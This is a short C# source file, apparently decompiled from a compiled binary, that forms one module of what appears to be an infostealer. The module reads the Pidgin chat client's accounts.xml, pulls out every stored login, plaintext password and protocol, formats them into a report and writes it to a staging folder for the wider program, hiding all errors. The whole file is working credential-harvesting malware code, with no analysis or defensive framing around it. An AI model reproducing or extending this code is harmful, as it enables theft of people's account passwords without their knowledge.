using System;
using System.IO;
using System.Xml;

// Token: 0x02000008 RID: 8
internal class Pidgin
{
	// Token: 0x06000012 RID: 18 RVA: 0x00003254 File Offset: 0x00001454
	public static void Start()
	{
		try
		{
			string text = string.Format("{0}Pidgin", global::Buffer.path_l);
			string text2 = string.Format("{0}.purple\\accounts.xml", global::Buffer.path_ad);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (File.Exists(text2))
			{
				string text3 = "";
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text2);
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					string innerText = xmlNode.ChildNodes[1].InnerText;
					string innerText2 = xmlNode.ChildNodes[2].InnerText;
					string innerText3 = xmlNode.ChildNodes[0].InnerText;
					if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
					{
						text3 += "=====================================\n";
						text3 = text3 + "Login: " + innerText + "\n";
						text3 = text3 + "Password: " + innerText2 + "\n";
						text3 = text3 + "Protocol: " + innerText3 + "\n";
						text3 += "=====================================\n\n\n";
					}
				}
				global::Buffer.XBufferData[17] = "1";
				File.WriteAllText(string.Format("{0}\\Pidgin.txt", text), text3.Trim().Replace("\n", Environment.NewLine));
			}
			else
			{
				File.WriteAllText(string.Format("{0}\\data.txt", text), string.Format("{0}", global::Buffer.head));
			}
		}
		catch
		{
		}
		global::Buffer.XBufferData[17] = "0";
	}
}
